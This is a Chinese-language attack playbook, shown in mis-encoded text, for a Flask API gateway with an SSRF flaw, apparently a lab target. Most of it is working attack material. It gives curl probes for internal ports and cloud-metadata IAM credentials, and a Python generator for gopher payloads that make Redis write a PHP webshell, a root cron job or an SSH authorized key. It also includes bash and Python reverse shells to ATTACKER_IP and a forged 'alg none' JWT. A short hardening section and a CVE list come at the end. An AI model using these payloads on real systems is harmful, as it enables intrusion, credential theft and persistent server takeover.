# API Gateway SSRF + Redis GetShell æ”»å‡»åº“

## ç›®æ ‡ä¿¡æ¯
- **ç«¯å£**: 8082
- **åº”ç”¨**: TechCorp API Gateway (Flask)
- **æŠ€æœ¯æ ˆ**: Flask + Redis (6379) + JWT
- **æ ¸å¿ƒæ¼æ´**: SSRF (/proxyç«¯ç‚¹) + Redisæœªæˆæƒè®¿é—®

---

## ğŸ”´ æ¼æ´1: SSRF (Server-Side Request Forgery)

### æ¼æ´æè¿°
`/proxy` ç«¯ç‚¹æœªéªŒè¯ `service` å‚æ•°ï¼Œå…è®¸æ”»å‡»è€…è®¿é—®ä»»æ„URLï¼ŒåŒ…æ‹¬å†…ç½‘æœåŠ¡ã€‚

### æ¼æ´ä»£ç 
```python
@app.route('/proxy')
def proxy():
    service = request.args.get('service', '')
    path = request.args.get('path', '/')
    
    # æ¼æ´ï¼šå…è®¸è‡ªå®šä¹‰URL
    if service in INTERNAL_SERVICES:
        target_url = INTERNAL_SERVICES[service] + path
    else:
        target_url = service + path  # âŒ æœªéªŒè¯ï¼Œå¯æ§
    
    try:
        resp = requests.get(target_url, timeout=5)
        return Response(resp.content, status=resp.status_code)
    except Exception as e:
        return jsonify({'error': str(e)}), 502
```

### åŸºç¡€åˆ©ç”¨

#### 1. æ¢æµ‹å†…ç½‘æœåŠ¡
```bash
# æ¢æµ‹Redis (6379)
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='

# æ¢æµ‹MySQL (3306)
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:3306&path='

# æ¢æµ‹å†…ç½‘æ®µ
curl 'http://localhost:8082/proxy?service=http://172.29.0.10:8080&path=/'
```

#### 2. ç«¯å£æ‰«æ
```bash
# æ‰¹é‡æ‰«æå¸¸è§ç«¯å£
for port in 22 80 443 3306 6379 8080 8081 9200; do
  echo -n "Port $port: "
  timeout 3 curl -s "http://localhost:8082/proxy?service=http://127.0.0.1:$port&path=" \
    && echo "OPEN" || echo "CLOSED"
done
```

#### 3. è¯»å–äº‘å…ƒæ•°æ®
```bash
# AWSå…ƒæ•°æ®
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/latest/meta-data/'

# AWS IAMå‡­è¯
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/latest/meta-data/iam/security-credentials/'

# Azureå…ƒæ•°æ®
curl 'http://localhost:8082/proxy?service=http://169.254.169.254&path=/metadata/instance?api-version=2021-02-01' \
  -H "Metadata:true"

# Google Cloudå…ƒæ•°æ®
curl 'http://localhost:8082/proxy?service=http://metadata.google.internal&path=/computeMetadata/v1/instance/service-accounts/default/token' \
  -H "Metadata-Flavor:Google"
```

---

## ğŸ¯ é«˜çº§æ”»å‡»ï¼šGopher + Redis å†™WebShell GetShell

### æ”»å‡»åŸç†
1. **SSRFæ”¯æŒGopheråè®®** - å¯å‘é€åŸå§‹TCPæ•°æ®åŒ…
2. **Redis RESPåè®®** - ä½¿ç”¨ SET + SAVE å‘½ä»¤å†™å…¥æ–‡ä»¶
3. **å†™å…¥WebShell** - ç›®æ ‡è·¯å¾„ `/var/www/html/shell.php`
4. **åå¼¹Shell** - é€šè¿‡WebShellæ‰§è¡Œå‘½ä»¤

### Gopher Payloadç”Ÿæˆè„šæœ¬

```python
#!/usr/bin/env python3
"""
ç”Ÿæˆæ”»å‡»Redisçš„Gopheråè®®Payload
ç›®æ ‡: é€šè¿‡SSRFå†™å…¥WebShell
"""
import urllib.parse

def generate_redis_webshell_payload(webshell_path="/var/www/html", filename="shell.php"):
    """
    ç”Ÿæˆå†™å…¥WebShellçš„Gopher Payload
    
    å‚æ•°:
        webshell_path: Webæ ¹ç›®å½•è·¯å¾„
        filename: WebShellæ–‡ä»¶å
    """
    
    # Rediså‘½ä»¤åºåˆ—
    redis_commands = [
        "FLUSHALL",  # æ¸…ç©ºæ•°æ®åº“ï¼ˆé˜²æ­¢å¹²æ‰°ï¼‰
        f"CONFIG SET dir {webshell_path}",  # è®¾ç½®ä¿å­˜ç›®å½•
        f"CONFIG SET dbfilename {filename}",  # è®¾ç½®æ–‡ä»¶å
        "SET webshell '<?php @eval($_POST[\"cmd\"]);?>'",  # WebShellå†…å®¹
        "SAVE"  # ä¿å­˜åˆ°ç£ç›˜
    ]
    
    # è½¬æ¢ä¸ºRedis RESPåè®®æ ¼å¼
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)  # åˆ†å‰²å‘½ä»¤å’Œå‚æ•°
        if len(parts) == 2:
            # å¤„ç†å¸¦å‚æ•°çš„å‘½ä»¤ï¼ˆå¦‚ SET key valueï¼‰
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        # RESPæ•°ç»„æ ¼å¼: *<å…ƒç´ æ•°é‡>\r\n
        redis_payload += f"*{len(all_parts)}\r\n"
        
        # æ¯ä¸ªå…ƒç´ : $<å­—èŠ‚é•¿åº¦>\r\n<å†…å®¹>\r\n
        for part in all_parts:
            # ç§»é™¤å¼•å·
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    # URLç¼–ç ï¼ˆGopheréœ€è¦ï¼‰
    # æ³¨æ„ï¼šæŸäº›å­—ç¬¦éœ€è¦ä¿ç•™\r\n
    encoded = urllib.parse.quote(redis_payload)
    
    # æ„é€ å®Œæ•´Gopher URL
    gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
    
    return gopher_url

def generate_cron_payload(attacker_ip, attacker_port=4444):
    """ç”ŸæˆCronå®šæ—¶ä»»åŠ¡åå¼¹Shellçš„Payload"""
    
    reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    
    redis_commands = [
        "FLUSHALL",
        "CONFIG SET dir /var/spool/cron",
        "CONFIG SET dbfilename root",
        f"SET cron '\\n\\n* * * * * {reverse_shell}\\n\\n'",
        "SAVE"
    ]
    
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)
        if len(parts) == 2:
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        redis_payload += f"*{len(all_parts)}\r\n"
        for part in all_parts:
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    encoded = urllib.parse.quote(redis_payload)
    return f"gopher://127.0.0.1:6379/_{encoded}"

def generate_ssh_key_payload(ssh_public_key):
    """ç”Ÿæˆå†™å…¥SSHå…¬é’¥çš„Payload"""
    
    redis_commands = [
        "FLUSHALL",
        "CONFIG SET dir /root/.ssh",
        "CONFIG SET dbfilename authorized_keys",
        f"SET sshkey '\\n\\n{ssh_public_key}\\n\\n'",
        "SAVE"
    ]
    
    redis_payload = ""
    for cmd in redis_commands:
        parts = cmd.split(' ', 1)
        if len(parts) == 2:
            cmd_name = parts[0]
            args = parts[1].split(' ', 1)
            all_parts = [cmd_name] + args
        else:
            all_parts = [parts[0]]
        
        redis_payload += f"*{len(all_parts)}\r\n"
        for part in all_parts:
            part_clean = part.strip("'\"")
            redis_payload += f"${len(part_clean)}\r\n{part_clean}\r\n"
    
    encoded = urllib.parse.quote(redis_payload)
    return f"gopher://127.0.0.1:6379/_{encoded}"


if __name__ == "__main__":
    import sys
    
    print("=== Redis Gopher Payload ç”Ÿæˆå™¨ ===\n")
    
    # æ–¹æ¡ˆ1: WebShell
    print("[1] WebShell Payload")
    webshell_gopher = generate_redis_webshell_payload()
    print(f"Gopher URL: {webshell_gopher[:100]}...\n")
    
    # æ„é€ SSRFæ”»å‡»URL
    ssrf_url = f"http://localhost:8082/proxy?service={urllib.parse.quote(webshell_gopher)}&path="
    print(f"å®Œæ•´æ”»å‡»URL: {ssrf_url[:150]}...")
    print(f"\nä½¿ç”¨æ–¹æ³•:")
    print(f'curl "{ssrf_url}"')
    print(f'curl http://target/shell.php -d "cmd=system(\'id\');"')
    print()
    
    # æ–¹æ¡ˆ2: Cronå®šæ—¶ä»»åŠ¡
    if len(sys.argv) > 1:
        attacker_ip = sys.argv[1]
        print(f"\n[2] Cronåå¼¹Shell Payload (æ”»å‡»è€…IP: {attacker_ip})")
        cron_gopher = generate_cron_payload(attacker_ip)
        cron_ssrf = f"http://localhost:8082/proxy?service={urllib.parse.quote(cron_gopher)}&path="
        print(f'curl "{cron_ssrf}"')
        print(f"nc -lvnp 4444  # ç›‘å¬ç«¯å£")
```

### å®Œæ•´æ”»å‡»æ­¥éª¤

#### Step 1: æ¢æµ‹Redisæ˜¯å¦å¼€æ”¾
```bash
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='

# ç¡®è®¤Rediså­˜æ´»
curl -s 'http://localhost:8082/cache/health'
# å“åº”: {"status": "healthy", "backend": "redis"}
```

#### Step 2: ç”ŸæˆGopher Payload
```bash
# ä¿å­˜ä¸Šé¢çš„Pythonè„šæœ¬ä¸º generate_gopher.py
python3 generate_gopher.py > attack_payload.txt

# æˆ–è€…æ‰‹åŠ¨æ„é€ ç®€åŒ–ç‰ˆ
cat << 'EOF' > simple_payload.py
import urllib.parse

# ç®€åŒ–çš„WebShellå†™å…¥å‘½ä»¤
payload = """*1\r
$8\r
FLUSHALL\r
*3\r
$3\r
SET\r
$1\r
x\r
$30\r
<?php @eval($_POST["cmd"]);?>\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$9\r
shell.php\r
*1\r
$4\r
SAVE\r
"""

gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload.replace('\r\n', '\r\n'))
ssrf_url = "http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher_url) + "&path="
print(ssrf_url)
EOF

python3 simple_payload.py
```

#### Step 3: å‘é€æ”»å‡»è¯·æ±‚
```bash
# è¯»å–ç”Ÿæˆçš„æ”»å‡»URL
ATTACK_URL=$(python3 generate_gopher.py | grep "å®Œæ•´æ”»å‡»URL" | cut -d: -f2-)

# å‘é€æ”»å‡»
curl "$ATTACK_URL"

# æˆ–è€…ç›´æ¥
curl "http://localhost:8082/proxy?service=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0Ax%0D%0A%2430%0D%0A%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%3F%3E%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A&path="
```

#### Step 4: éªŒè¯WebShell
```bash
# å‡è®¾ç›®æ ‡æœåŠ¡å™¨Webæ ¹ç›®å½•æ˜¯ /var/www/html
# WebShellè·¯å¾„: http://target-server/shell.php

# æµ‹è¯•å‘½ä»¤æ‰§è¡Œ
curl http://target-server/shell.php -d "cmd=system('id');"
curl http://target-server/shell.php -d "cmd=system('whoami');"
curl http://target-server/shell.php -d "cmd=system('pwd');"
```

#### Step 5: åå¼¹Shell
```bash
# åœ¨æ”»å‡»æœºç›‘å¬
nc -lvnp 4444

# åœ¨å¦ä¸€ä¸ªç»ˆç«¯å‘é€åå¼¹Shellå‘½ä»¤
curl http://target-server/shell.php \
  -d "cmd=system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');"

# æˆ–è€…ä½¿ç”¨Pythonåå¼¹
curl http://target-server/shell.php \
  -d "cmd=system('python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"');"
```

---

## æ›¿ä»£æ”»å‡»æ–¹æ¡ˆ

### æ–¹æ¡ˆ2: Cronå®šæ—¶ä»»åŠ¡åå¼¹Shell

**ä¼˜ç‚¹**: ä¸ä¾èµ–Webç›®å½•ï¼Œæ›´éšè”½

```bash
# ç”ŸæˆCron Payload
python3 << 'EOF'
import urllib.parse

attacker_ip = "YOUR_IP"
attacker_port = "4444"

redis_cmds = f"""*1\r
$8\r
FLUSHALL\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$3\r
dir\r
$16\r
/var/spool/cron\r
*4\r
$6\r
CONFIG\r
$3\r
SET\r
$10\r
dbfilename\r
$4\r
root\r
*3\r
$3\r
SET\r
$1\r
x\r
$60\r


* * * * * bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1


\r
*1\r
$4\r
SAVE\r
"""

gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(redis_cmds)
print("http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher) + "&path=")
EOF

# ç›‘å¬ç«¯å£
nc -lvnp 4444

# å‘é€æ”»å‡»ï¼ˆæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰
```

### æ–¹æ¡ˆ3: SSHå…¬é’¥å†™å…¥

**ä¼˜ç‚¹**: æŒä¹…åŒ–è®¿é—®

```bash
# 1. ç”ŸæˆSSHå¯†é’¥å¯¹
ssh-keygen -t rsa -b 2048 -f /tmp/redis_key -N ""

# 2. è¯»å–å…¬é’¥
PUB_KEY=$(cat /tmp/redis_key.pub)

# 3. ç”ŸæˆPayload
python3 << EOF
import urllib.parse

pub_key = """$PUB_KEY"""

redis_cmds = f"""*1\r
\$8\r
FLUSHALL\r
*4\r
\$6\r
CONFIG\r
\$3\r
SET\r
\$3\r
dir\r
\$10\r
/root/.ssh\r
*4\r
\$6\r
CONFIG\r
\$3\r
SET\r
\$10\r
dbfilename\r
\$15\r
authorized_keys\r
*3\r
\$3\r
SET\r
\$1\r
x\r
\${len(pub_key) + 4}\r


{pub_key}


\r
*1\r
\$4\r
SAVE\r
"""

gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(redis_cmds)
print("http://localhost:8082/proxy?service=" + urllib.parse.quote(gopher) + "&path=")
EOF

# 4. å‘é€æ”»å‡»åç™»å½•
ssh -i /tmp/redis_key root@target-server
```

---

## ğŸ”´ æ¼æ´2: JWT Algorithm='none' ç»•è¿‡

### æ¼æ´æè¿°
JWTéªŒè¯æ—¶å…è®¸ `algorithm='none'`ï¼Œæ”»å‡»è€…å¯ä¼ªé€ æ— ç­¾åTokenç»•è¿‡éªŒè¯ã€‚

### æ¼æ´ä»£ç 
```python
@app.route('/admin/dashboard')
def admin_dashboard():
    token = request.headers.get('Authorization', '')[7:]
    
    # âŒ å…è®¸algorithm='none'ï¼ˆä»…PyJWT 1.xï¼‰
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256', 'none'])
    
    if payload.get('role') != 'admin':
        return jsonify({'error': 'Insufficient privileges'}), 403
```

### åˆ©ç”¨æ–¹æ³•ï¼ˆä»…é€‚ç”¨PyJWT 1.xï¼‰

```python
#!/usr/bin/env python3
import json
import base64

def create_none_jwt(payload):
    """åˆ›å»ºalgorithm='none'çš„JWT"""
    header = {"alg": "none", "typ": "JWT"}
    
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # æ— ç­¾åï¼Œç»“å°¾æ˜¯ç©ºå­—ç¬¦ä¸²ï¼ˆä½†ä¿ç•™ç‚¹å·ï¼‰
    return f"{h}.{p}."

# ä¼ªé€ ç®¡ç†å‘˜Token
admin_payload = {
    "username": "fake_admin",
    "role": "admin",
    "exp": 9999999999
}

admin_token = create_none_jwt(admin_payload)
print(f"ä¼ªé€ Token: {admin_token}")
```

ä½¿ç”¨ä¼ªé€ Tokenï¼š
```bash
FAKE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImZha2VfYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."

curl http://localhost:8082/admin/dashboard \
  -H "Authorization: Bearer $FAKE_TOKEN"
```

**æ³¨æ„**: PyJWT 2.x å·²é»˜è®¤ç¦ç”¨æ­¤æ¼æ´ï¼Œéœ€é™çº§åˆ°1.xç‰ˆæœ¬æ‰èƒ½åˆ©ç”¨ã€‚

---

## å®Œæ•´æ”»å‡»é“¾ç»„åˆ

### åœºæ™¯: ä»SSRFåˆ°å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

```bash
# ===== ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›† =====
# 1. æ¢æµ‹å†…ç½‘æœåŠ¡
curl 'http://localhost:8082/proxy?service=http://127.0.0.1:6379&path='
curl 'http://localhost:8082/cache/health'

# 2. ç«¯å£æ‰«æ
for port in {6379,3306,8080,9200}; do
  echo "Testing $port..."
  curl -s "http://localhost:8082/proxy?service=http://127.0.0.1:$port&path=" | head -3
done

# ===== ç¬¬äºŒé˜¶æ®µï¼šåˆ©ç”¨SSRFæ”»å‡»Redis =====
# 3. ç”ŸæˆGopher Payloadå†™WebShell
python3 generate_gopher.py > /tmp/attack_url.txt

# 4. å‘é€æ”»å‡»
ATTACK_URL=$(cat /tmp/attack_url.txt)
curl "$ATTACK_URL"

# ===== ç¬¬ä¸‰é˜¶æ®µï¼šGetShell =====
# 5. è®¿é—®WebShell
curl http://target-server/shell.php -d "cmd=whoami"
curl http://target-server/shell.php -d "cmd=uname -a"

# 6. åå¼¹Shell
nc -lvnp 4444  # ç›‘å¬ç«¯å£

curl http://target-server/shell.php \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# ===== ç¬¬å››é˜¶æ®µï¼šæƒé™ç»´æŒ =====
# 7. å†™å…¥SSHå…¬é’¥ï¼ˆæŒä¹…åŒ–ï¼‰
# 8. åˆ›å»ºCronå®šæ—¶ä»»åŠ¡ï¼ˆéšè”½åé—¨ï¼‰
```

---

## é˜²å¾¡å»ºè®®

### 1. SSRFé˜²æŠ¤

```python
# ä¸¥æ ¼ç™½åå•
ALLOWED_SERVICES = ['user-service', 'payment-service', 'admin-panel']
INTERNAL_SERVICES_URLS = {
    'user-service': 'http://172.29.0.10:8080',
    'payment-service': 'http://172.29.0.11:8080',
    'admin-panel': 'http://172.29.0.12:8080'
}

@app.route('/proxy')
def proxy():
    service = request.args.get('service', '')
    path = request.args.get('path', '/')
    
    # åªå…è®¸ç™½åå•æœåŠ¡
    if service not in ALLOWED_SERVICES:
        return jsonify({'error': 'Invalid service'}), 400
    
    target_url = INTERNAL_SERVICES_URLS[service] + path
    
    # ç¦æ­¢åè®®é‡å®šå‘
    resp = requests.get(target_url, timeout=5, allow_redirects=False)
    return Response(resp.content, status=resp.status_code)
```

**é¢å¤–é˜²æŠ¤æªæ–½**:
```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """æ£€æŸ¥URLæ˜¯å¦å®‰å…¨"""
    try:
        parsed = urlparse(url)
        
        # åªå…è®¸HTTP/HTTPS
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # è§£æIPåœ°å€
        ip = ipaddress.ip_address(parsed.hostname)
        
        # ç¦æ­¢å†…ç½‘IP
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
        
        # ç¦æ­¢ä¿ç•™åœ°å€
        if ip.is_reserved:
            return False
        
        return True
    except:
        return False
```

### 2. RedisåŠ å›º

```bash
# /etc/redis/redis.conf

# 1. è®¾ç½®å¼ºå¯†ç 
requirepass your_very_strong_password_here_min_32_chars

# 2. ç»‘å®šæœ¬åœ°ï¼ˆç¦æ­¢å¤–ç½‘è®¿é—®ï¼‰
bind 127.0.0.1 ::1

# 3. ç¦ç”¨å±é™©å‘½ä»¤
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command SHUTDOWN ""
rename-command DEBUG ""

# 4. å¯ç”¨ä¿æŠ¤æ¨¡å¼
protected-mode yes

# 5. ç¦æ­¢ä»¥rootè¿è¡Œ
# åˆ›å»ºä¸“ç”¨ç”¨æˆ·
# useradd -r -s /bin/false redis
```

### 3. JWTå®‰å…¨

```python
# åªå…è®¸å¼ºç­¾åç®—æ³•
payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])

# æˆ–è€…ä½¿ç”¨éå¯¹ç§°åŠ å¯†
payload = jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])

# é¢å¤–éªŒè¯
if jwt.get_unverified_header(token).get('alg') == 'none':
    return jsonify({'error': 'Invalid algorithm'}), 401
```

### 4. ç½‘ç»œéš”ç¦»

```bash
# ä½¿ç”¨iptablesé™åˆ¶Redisè®¿é—®
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# Dockerç½‘ç»œéš”ç¦»
docker network create --internal redis-internal
docker run --network redis-internal redis
```

---

## ç›¸å…³CVE

- **SSRF**: CVE-2021-26855 (Microsoft Exchange ProxyLogon)
- **JWT None**: CVE-2015-9235, CVE-2018-1000531
- **Redisæœªæˆæƒ**: CVE-2022-0543 (Luaæ²™ç®±é€ƒé€¸)
- **Gopher SSRF**: CVE-2017-9506 (Jira SSRF)

---

## å·¥å…·æ¨è

- **SSRFmap** - è‡ªåŠ¨åŒ–SSRFåˆ©ç”¨æ¡†æ¶
- **Gopherus** - Gopheråè®®Payloadç”Ÿæˆå™¨
- **jwt_tool** - JWTå®‰å…¨æµ‹è¯•å·¥å…·
- **redis-rogue-server** - Redisä¸»ä»å¤åˆ¶RCEå·¥å…·

---

## å‚è€ƒé“¾æ¥

- [Redis Security](https://redis.io/topics/security)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Gopher Protocol Exploitation](https://blog.chaitin.cn/gopher-attack-surfaces/)

---

**æ–‡æ¡£ç‰ˆæœ¬**: 1.0  
**åˆ›å»ºæ—¶é—´**: 2025-11-22  
**é€‚ç”¨åœºæ™¯**: API Gatewayã€å¾®æœåŠ¡æ¶æ„ã€Redisç¼“å­˜ç³»ç»Ÿ
